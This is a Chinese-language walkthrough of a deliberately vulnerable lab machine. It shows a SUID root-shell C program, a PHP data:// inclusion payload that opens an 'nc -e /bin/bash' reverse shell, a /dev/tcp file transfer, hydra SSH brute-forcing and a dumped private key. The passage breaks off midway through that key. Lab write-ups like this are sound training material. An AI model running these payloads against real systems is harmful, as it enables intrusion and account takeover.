<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap 192.168.58.83            </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">21</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>)</span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: F2:<span class="number">89</span>:<span class="number">91</span>:<span class="number">6</span>B:<span class="number">3</span>E:<span class="number">9</span>D (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.30</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>常规的端口，直接去web里面看看。</p>
<h1 id="web探测1"><a href="#web探测1" class="headerlink" title="web探测1"></a>web探测1</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.83             </span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里给出了很多用户名，而且给出了一个类似于用户凭据的东西<code>theuser/different</code> 我先试试</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh theuser@<span class="number">192.168</span>.<span class="number">58.83</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.58.83 (192.168.58.83)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:C2ARiZ0bIPPaLPinl6orW4V74Oo6OBUH2j0JSGrwcu8.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.58.83&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">theuser@<span class="number">192.168</span>.<span class="number">58.83</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux suidyrevenge <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Fri Oct  <span class="number">2</span> <span class="number">09</span>:<span class="number">19</span>:<span class="number">02</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">theuser@suidyrevenge:~$ id</span><br><span class="line">uid=<span class="number">1004</span>(theuser) gid=<span class="number">1004</span>(theuser) groups=<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>发现真的可以登录</p>
<h1 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h1><p>即然登录进来那就看看有没有什么东西吧<br>没有sudo，有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">theuser:</span> </span><br><span class="line">Sorry, user theuser may not run sudo on suidyrevenge.</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/suidy</span><span class="regexp">/suidyyyyy</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/violent</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br></pre></td></tr></table></figure></div>
<p>这里在suidy用户目录下面有一个suid文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">theuser@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 52</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ file suidyyyyy </span><br><span class="line">suidyyyyy: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version<span class="number"> 1 </span>(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=863d91411490dee69e751d36cbdc3b45b593f459, not stripped</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ ./suidyyyyy </span><br><span class="line">suidy@suidyrevenge:/home/suidy$ id</span><br><span class="line">uid=1005(suidy) gid=1004(theuser) groups=1004(theuser)</span><br></pre></td></tr></table></figure></div>
<p>这是一个可执行文件,执行之后发现拿到suidy的用户了。把这个文件拿到本地看看是做了什么事</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234 &gt; suidy</span></span><br><span class="line">                           </span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat suidyyyyy  &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">58.11</span>/<span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>在ida里面看，发现就是一个设置suid然后拿到shell的程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setuid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">setgid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个suidy目录下面还有一个note</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt</span><br><span class="line">I know that theuser is <span class="keyword">not</span> here anymore but suidyyyyy is now more secure!</span><br><span class="line">root runs the script as <span class="keyword">in</span> the past that always gives <span class="title class_">SUID</span> to suidyyyyy binary</span><br><span class="line">but this time also check the size of the file.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">DONT</span> <span class="title class_">WANT</span> <span class="title class_">MORE</span> <span class="string">&quot;theuser&quot;</span> <span class="title class_">HERE</span>!.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">ARE</span> <span class="title class_">SECURE</span> <span class="title class_">NOW</span>.</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<p>这里说suidyyyyy总是有suid权限，还说道了检查file的size<br>那根据这个提示，肯定就是要对这个有suid的程序做手脚了，而且这个程序还是属于theuser组，有rws权限<br>因为这个文件的属组是theuser，我就先用了theuser用户写一个c文件，但是这个文件的目录是suidy的，theuser没有写入权限<br>那现在我也写一个得到bash的文件，设置uid和gid是0 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">suidy@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 76</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Mar <span class="number"> 4 </span>08:54 .</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>suidy theuser<span class="number"> 16712 </span>Mar <span class="number"> 4 </span>08:54 hack</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>suidy theuser   <span class="number"> 97 </span>Mar <span class="number"> 4 </span>08:54 hack.c</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">suidy@suidyrevenge:/home/suidy$ cat hack.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;/bin/bash&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>刚才提示我们说大小，发现这个大小也是刚好一样的，看来就没有什么问题<br>但是这里我用cp命令，发现说这个suidyyyyy busy，是因为我们这个bash就是运行这个程序得到的，那我们又不知道suidy的密码，所以就直接删除这个文件吧<br>过了一会发现这个suidyyyyy程序又出现了，估计就是一个定时任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">hack  hack.c  note.txt  suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cp /home/suidy/hack /home/suidy/suidyyyyy </span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br><span class="line">root<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>发现成功了，但是为什么这个是个hard靶机呢。这样下来一看也就是个easy。翻了一下wp，发现原来这里web有第二种方式拿到www用户然后提权</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.83</span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>根据这里的提示信息，theuser放了两个后门php文件在&#x2F;supersecure，这里在本机上面先看看这些文件是什么名字</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">ls</span> /usr/share/webshells/php </span><br><span class="line">findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后发现这个simple-backdoor.php是可以用的，使用方式就是?cmd的任意命令执行<br>发现这个目录下面有两个的后门分别是<br><img src="https://pic1.imgdb.cn/item/67c70bebd0e0a243d40be657.png"><br>但是在这里反弹shell没有成功<br><img src="https://pic1.imgdb.cn/item/67c70c60d0e0a243d40be67e.png"><br>那就尝试另外一个后门文件<br><img src="https://pic1.imgdb.cn/item/67c70ca1d0e0a243d40be681.png"><br>这个后门文件是用来读取文件，所以就想到用php伪协议执行命令<br>拿到www的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>/supersecure/mysuperbackdoor.php?file=data:<span class="regexp">//</span>text/plain,<span class="variable">%3C</span>?php<span class="variable">%20system</span>(<span class="variable">%2</span>2nc<span class="variable">%20</span>-e<span class="variable">%20</span>/bin/bash<span class="variable">%20192</span><span class="number">.168</span><span class="number">.58</span><span class="number">.11</span><span class="variable">%20123</span>4<span class="variable">%22</span>);</span><br><span class="line">┌──(root㉿kakeru)-[<span class="regexp">/usr/s</span>hare/webshells/php]</span><br><span class="line">└─<span class="comment"># nc -lp 1234        </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
<h1 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>ls</span><br><span class="line">index.html  murdanote.txt  supersecure</span><br><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat murdanote.txt </span><br><span class="line">I always lost my password so <span class="title class_">Im</span> using </span><br><span class="line">one password from rockyou.txt !</span><br><span class="line"></span><br><span class="line">-murda</span><br></pre></td></tr></table></figure></div>
<p>找到一个murda提示文件，提示我们要用rockyou字典爆破密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l murda -P rockyou.txt ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">53</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>   <span class="keyword">login</span>: murda   <span class="keyword">password</span>: iloveyou</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">37</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure></div>
<p>登录到murda  有一个secret.txt文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">murda@suidyrevenge:~$ ls</span><br><span class="line">secret.txt</span><br><span class="line">murda@suidyrevenge:~$ cat secret.txt </span><br><span class="line">I know <span class="literal">that</span> theuser <span class="keyword">is</span> here!</span><br><span class="line">I just got the id_rsa <span class="keyword">from</span> <span class="string">&quot;violent&quot;</span>.</span><br><span class="line">I will put the key <span class="keyword">in</span> a secure place <span class="keyword">for</span> theuser!</span><br><span class="line">I hope he find <span class="literal">it</span>.</span><br><span class="line">Remember <span class="literal">that</span> rockyou.txt <span class="keyword">is</span> your friend!</span><br></pre></td></tr></table></figure></div>
<p>根据提示找到这个id_rsa</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">murda@suidyrevenge:~$ find <span class="symbol">/</span> <span class="operator">-</span>name <span class="string">&quot;id_rsa&quot;</span> <span class="operator">-</span>print <span class="number">2</span><span class="operator">&gt;</span><span class="symbol">/dev/null</span></span><br><span class="line"><span class="symbol">/usr/games/id_rsa</span></span><br><span class="line">murda@suidyrevenge:~$ cat <span class="symbol">/usr/games/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDGbexiJO</span><br><span class="line">b7KaTASSyt9yKFAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC<span class="symbol">/9FkJSQol</span></span><br><span class="line">CNgAMG4SeDpKctz5<span class="symbol">/h6ylTx0vT73OzMwYO97HL/tRrfL0gOWV2UNTuOFwg5fBorYZfBgql</span></span><br><span class="line">bVzsIuCitxvoButf59aeoZtLxeUUuUm3G7Q06IvLV2vj<span class="operator">+</span>VgJ2i2tUjXboCcQ0Yv<span class="operator">+</span>Bj9JBC</span><br><span class="line"><span class="operator">+</span><span class="symbol">/6fG9j+ED7Pi42zjm9zNQsPhrwviHptksnKwpsV5KhBNuO3heeZvydX/sudsCCrYXBKoe</span></span><br><span class="line">P8abXDqJYXhjskJupu8Rb0bcLxR1uEIGgsRww7waBaiag65WnXBwTrzjriWFdCJcI2lfdc</span><br><span class="line">l7g<span class="symbol">/b6T5UfxFSzmdNEZvaH/SNvPEpE8bAUW9rcJwwEJZyIrc4z5VAAAD0PmVBELTPOuptO</span></span><br><span class="line"><span class="number">2</span>LGbENxSNYTLn6TqacFrj76WfTo7Q81QdCw9IJ0ruu0ivvtQWAS2CmG7Hq7vE8b<span class="operator">+</span>T6KI8w</span><br><span class="line">sRJkfpON5nr5e<span class="operator">+</span>mfCGD7Gt0WVBaZ1SolbN17XoSNyTNq8jqF9EcwnsqIM8SRWrLERufCCs</span><br><span class="line">SMDJlGb2<span class="symbol">/khum3fgDvI1R7gm0KYQRRJu33qx9ZXHRmCGKvEMV/pSaIJb2JBTQ9N/QcMlVK</span></span><br><span class="line">RGsVC<span class="symbol">/NNhwcWSMQh6DGLmcC+yZvo5lxBnNUibWKNtf2zTx6yep6SwVzvt9Qg5aZ1exIEYa</span></span><br><span class="line"><span class="number">9</span>bmpZCzHVpHHK859U1l0FNJoBFrCiC0CssPv4E<span class="operator">+</span>g1iLA47NXYCeQxpWvZPsqXwr<span class="operator">+</span>J46vR9</span><br><span class="line">UC<span class="operator">+</span>pZHy9bOHc0J<span class="operator">+</span>CTP80vEazyMN0Uko9<span class="symbol">/R2iJ+7GeQgtzoVBt7mqjaoIDljXOQ6YD5F7a8</span></span><br><span class="line"><span class="number">5</span>LvfFgW691eKdoZbGjaALMdV629MHdm6t5KL56YO9bbWlpgvo61iYqrAE2t<span class="operator">+</span>jhlUoQeQ<span class="operator">+</span><span class="number">9</span></span><br><span class="line">cH8fKHVXctRCypsx577qTwnUFtLn<span class="operator">+</span>l3f<span class="operator">+</span>Twl1ulxpV<span class="symbol">/bs497n1a1aDNpAoMJYt0601+3H8</span></span><br><span class="line">qJQQ12QiBEi1CTvt<span class="operator">+</span>W2<span class="symbol">/d1EQeZ+MDUSqFCLDGE34xu6lI+/Wjmv03qBSRvdUK91MX1Lb2n</span></span><br><span 